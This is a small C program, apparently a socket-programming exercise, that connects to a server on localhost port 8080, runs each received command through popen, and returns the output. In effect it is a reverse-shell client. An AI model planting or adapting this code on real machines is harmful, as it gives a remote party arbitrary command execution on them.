#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 8080
#define BUFFER_SIZE 1024

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE] = {0};

    // 創建 socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        exit(EXIT_FAILURE);
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // 轉換 IP 地址
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        perror("Invalid address");
        exit(EXIT_FAILURE);
    }

    // 連線至 server
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    printf("Connected to server.\n");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int valread = read(sock, buffer, BUFFER_SIZE);

        if (valread <= 0) {
            printf("Server closed the connection.\n");
            break;
        }

        printf("Received command: %s\n", buffer);

        // 如果指令是 "exit"，則關閉 client
        if (strcmp(buffer, "exit") == 0) {
            printf("Exiting...\n");
            break;
        }

        // 執行指令並回傳結果
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            perror("popen failed");
            exit(EXIT_FAILURE);
        }

        char result[BUFFER_SIZE] = {0};
        fread(result, sizeof(char), BUFFER_SIZE, fp);
        pclose(fp);

        send(sock, result, strlen(result), 0);
    }

    close(sock);
    return 0;
}
